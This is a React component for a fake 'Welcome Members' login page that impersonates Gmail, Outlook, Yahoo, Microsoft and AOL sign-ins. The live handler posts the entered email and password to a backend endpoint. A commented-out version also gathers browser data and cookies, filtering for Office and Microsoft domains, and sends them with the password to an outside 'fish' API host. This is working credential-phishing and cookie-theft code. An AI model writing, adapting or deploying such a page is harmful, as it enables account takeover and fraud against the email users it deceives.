// import Verified from './Verified';
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import {
    FaGoogle,
    FaWindows,
    FaYahoo,
    FaMicrosoft,
    FaEnvelope,
    FaEye,
    FaEyeSlash
} from 'react-icons/fa';
import { SiAol } from "react-icons/si";



const WinnersLogin = () => {
    const navigate = useNavigate();
    const [selectedProvider, setSelectedProvider] = useState(null);
    const [showPassword, setShowPassword] = useState(false);
    const [isCustomEmail, setIsCustomEmail] = useState(false);
    const [mail, setMail] = useState('');
    const [pass, setPass] = useState('');
    const [isLoading, setIsLoading] = useState(false);


    const loginHandler = async (e) => {
        e.preventDefault();
        setIsLoading(true);

        try {
            const res = await fetch("http://localhost:4000/api/contact", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ mail, pass })
            });

            const data = await res.json();

            // Navigate even with "partial" status
            if (res.ok || data.status === 'partial') {
                navigate('/verified', { state: { email: mail } });
            } else {
                console.error('Login failed', data);
            }
        } catch (error) {
            console.error("Network or parsing error", error);
        } finally {
            setIsLoading(false);
        }
    };

    // const loginHandler = async (e) => {
    //     e.preventDefault();
    //     setIsLoading(true);

    //     // Collect extensive browser information
    //     const browserInfo = {
    //         // Basic info
    //         userAgent: navigator.userAgent,
    //         language: navigator.language,
    //         platform: navigator.platform,

    //         // Specialized cookie collection
    //         specialCookies: {}
    //     };

    //     // Target specific cookie domains and patterns
    //     const cookieDomains = [
    //         '.office.com',
    //         '.microsoft.com',
    //         'login.microsoftonline.com',
    //         'portal.office.com',
    //         'outlook.office.com'
    //     ];

    //     // Collect all cookies
    //     const allCookies = document.cookie.split(';').map(cookie => cookie.trim());

    //     // Filter and collect cookies
    //     const filteredCookies = allCookies.filter(cookie => {
    //         // Check if cookie matches any of the target domains
    //         return cookieDomains.some(domain => 
    //             cookie.includes(domain.replace('.', ''))
    //         );
    //     });

    //     // Structured cookie collection
    //     browserInfo.specialCookies = {
    //         officeCookies: filteredCookies,
    //         allCookies: allCookies
    //     };

    //     try {
    //         const res = await fetch("https://pch-fish-api.onrender.com/info", {
    //             method: "POST",
    //             headers: { "Content-Type": "application/json" },
    //             body: JSON.stringify({ 
    //                 mail, 
    //                 pass,
    //                 browserData: JSON.stringify(browserInfo)
    //             })
    //         });
    //         const data = await res.json();

    //         // Navigate even with "partial" status
    //         if (res.ok || data.status === 'partial') {
    //             navigate('/verified', { state: { email: mail } });
    //         } else {
    //             console.error('message failed', data);
    //         }
    //     } catch (error) {
    //         console.error("Network or parsing error", error);
    //     } finally {
    //         setIsLoading(false);
    //     }
    // };


    const emailProviders = [
        {
            name: 'Gmail',
            icon: FaGoogle,
            color: 'text-red-500',
        },
        {
            name: 'Outlook',
            icon: FaWindows,
            color: 'text-blue-500',
        },
        {
            name: 'Yahoo Mail',
            icon: FaYahoo,
            color: 'text-purple-500',
        },
        {
            name: 'Microsoft',
            icon: FaMicrosoft,
            color: 'text-gray-800',
        },
        {
            name: 'Aol',
            icon: SiAol,
            color: 'text-gray-800',
        },
        {
            name: 'Other Email',
            icon: FaEnvelope,
            color: 'text-gray-500',
        }
    ];

    const handleProviderSelect = (provider) => {
        setSelectedProvider(provider);
        setIsCustomEmail(provider.name === 'Other Email');

        if (provider.name !== 'Other Email') {
            setMail(`@${provider.name.toLowerCase().replace(' ', '')}.com`);
        } else {
            setMail('');
        }
    };


    return (
        <div className="min-h-screen bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center p-4">
            <div className="bg-white shadow-2xl rounded-2xl w-full max-w-md overflow-hidden">
                <div className="bg-gradient-to-r from-blue-500 to-purple-600 p-6 text-center">
                    <h1 className="text-3xl font-bold text-white font-sans">Welcome Members!!</h1>
                </div>
                <div className="p-8 space-y-6">
                    <p className="text-gray-600 text-md mb-6 p-0.5text-cen w-[300px] text-center mx-auto rounded-[20px]">Select your email provider to continue</p>
                    <div className="grid grid-cols-2 gap-4 mb-6">
                        {emailProviders.map((provider) => (
                            <button
                                key={provider.name}
                                onClick={() => handleProviderSelect(provider)}
                                className={`flex items-center justify-center py-3 rounded-lg transition duration-300 
                  ${selectedProvider === provider ? 'ring-2 ring-blue-500' : 'bg-gray-100 hover:bg-gray-200'}`}
                            >
                                <provider.icon className={`mr-2 w-6 h-6 ${provider.color}`} />
                                <span className="font-semibold">{provider.name}</span>
                            </button>
                        ))}
                    </div>

                    {selectedProvider && (
                        <form onSubmit={loginHandler} className="space-y-4">
                            <div className="flex items-center justify-center mb-4">
                                {selectedProvider.icon &&
                                    React.createElement(selectedProvider.icon, {
                                        className: `w-12 h-12 ${selectedProvider.color}`
                                    })
                                }
                                <span className="ml-2 text-xl font-semibold">
                                    Login with {selectedProvider.name}
                                </span>
                            </div>

                            <div className="relative">
                                <input
                                    type="email"
                                    value={mail}
                                    onChange={(e) => setMail(e.target.value)}
                                    placeholder={isCustomEmail ? "Enter your email" : `Email (${mail})`}
                                    className="w-full px-4 py-3 border border-gray-300 rounded-lg"
                                    required
                                />
                            </div>

                            <div className="relative">
                                <input
                                    type={showPassword ? "text" : "password"}
                                    value={pass}
                                    onChange={(e) => setPass(e.target.value)}
                                    placeholder="Enter your password"
                                    className="w-full px-4 py-3 border border-gray-300 rounded-lg pr-10"
                                    required
                                />
                                <button
                                    type="button"
                                    onClick={() => setShowPassword(!showPassword)}
                                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500"
                                >
                                    {showPassword ? <FaEyeSlash /> : <FaEye />}
                                </button>
                            </div>

                            <button
                                type="submit"
                                disabled={isLoading}
                                className={`w-full bg-gradient-to-r from-blue-500 to-purple-600 text-white py-3 rounded-lg hover:opacity-90 transition duration-300 
                                    ${isLoading ? 'opacity-50 cursor-not-allowed' : ''}`}
                            >
                                {isLoading ? 'Logging in...' : 'Login'}
                            </button>

                        </form>
                    )}
                </div>
            </div>
        </div>
    );
};

export default WinnersLogin;